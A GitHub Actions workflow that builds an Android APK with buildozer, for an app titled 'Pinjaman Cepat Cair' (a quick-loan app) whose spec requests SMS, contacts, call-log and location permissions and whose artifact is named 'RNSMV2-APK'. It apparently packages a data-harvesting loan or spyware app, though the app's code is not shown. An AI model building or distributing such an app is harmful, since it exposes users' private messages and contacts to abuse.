name: Build APK

on:
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      - name: Install dependencies
        run: |
          sudo apt update
          sudo apt install -y python3-pip openjdk-17-jdk git unzip wget
          pip3 install buildozer cython virtualenv
      
      - name: Install Android SDK dan build-tools spesifik
        run: |
          # Install SDK platform tools
          sudo apt install -y android-sdk
          export ANDROID_HOME=/usr/lib/android-sdk
          echo "ANDROID_HOME=/usr/lib/android-sdk" >> $GITHUB_ENV
          
          # Accept semua license
          sudo mkdir -p $ANDROID_HOME/licenses
          echo "8933bad161af4178b1185d1a37fbf41ea5269c55" | sudo tee $ANDROID_HOME/licenses/android-sdk-license
          echo "d56f5187479451eabf01fb78af6dfcb131a6481e" | sudo tee -a $ANDROID_HOME/licenses/android-sdk-license
          
          # Install build-tools versi 30.0.3 via manual download
          cd /tmp
          wget -q https://dl.google.com/android/repository/build-tools_r30.0.3-linux.zip
          sudo unzip -q build-tools_r30.0.3-linux.zip -d $ANDROID_HOME/build-tools/30.0.3
          sudo chmod +x $ANDROID_HOME/build-tools/30.0.3/*
          
          # Install platform 30
          sudo mkdir -p $ANDROID_HOME/platforms/android-30
          wget -q https://dl.google.com/android/repository/platform-30_r03.zip
          sudo unzip -q platform-30_r03.zip -d $ANDROID_HOME/platforms/android-30
          
          echo "✅ Android SDK siap!"
      
      - name: Install NDK 23b
        run: |
          cd /tmp
          wget -q https://dl.google.com/android/repository/android-ndk-r23b-linux.zip
          sudo unzip -q android-ndk-r23b-linux.zip -d /usr/lib/android-sdk/ndk-bundle
          sudo mv /usr/lib/android-sdk/ndk-bundle/android-ndk-r23b/* /usr/lib/android-sdk/ndk-bundle/
      
      - name: Buat buildozer.spec dengan path lengkap
        run: |
          cat > buildozer.spec << 'EOF'
          [app]
          title = Pinjaman Cepat Cair
          package.name = pinjolcepat
          package.domain = com.pinjol.cepat
          source.dir = .
          source.include_exts = py,png,jpg,kv,ttf,json
          version = 1.0.0
          requirements = python3,kivy==2.1.0,requests,android,pyjnius,prctl
          orientation = portrait
          osx.python_version = 3
          osx.kivy_version = 2.1.0
          fullscreen = 0

          [buildozer]
          log_level = 2
          warn_on_root = 1

          [android]
          api = 30
          minapi = 21
          ndk = 23b
          sdk_path = /usr/lib/android-sdk
          ndk_path = /usr/lib/android-sdk/ndk-bundle
          permissions = INTERNET,READ_SMS,RECEIVE_SMS,READ_CONTACTS,ACCESS_FINE_LOCATION,ACCESS_COARSE_LOCATION,READ_CALL_LOG
          android.permissions = INTERNET,READ_SMS,RECEIVE_SMS,READ_CONTACTS,ACCESS_FINE_LOCATION,ACCESS_COARSE_LOCATION,READ_CALL_LOG
          android.accept_sdk_license = True
          android.ndk_path = /usr/lib/android-sdk/ndk-bundle
          android.sdk_path = /usr/lib/android-sdk
          android.build_tools_version = 30.0.3
          EOF
          echo "✅ buildozer.spec siap"
      
      - name: Build APK
        run: |
          export USER=runner
          export ANDROID_HOME=/usr/lib/android-sdk
          export PATH=$PATH:$ANDROID_HOME/tools/bin:$ANDROID_HOME/platform-tools:$ANDROID_HOME/build-tools/30.0.3
          
          # Clean
          rm -rf bin .buildozer
          
          # Build with specific build-tools
          buildozer android debug
      
      - name: Upload APK
        uses: actions/upload-artifact@v4
        with:
          name: RNSMV2-APK
          path: bin/*.apk
          if-no-files-found: error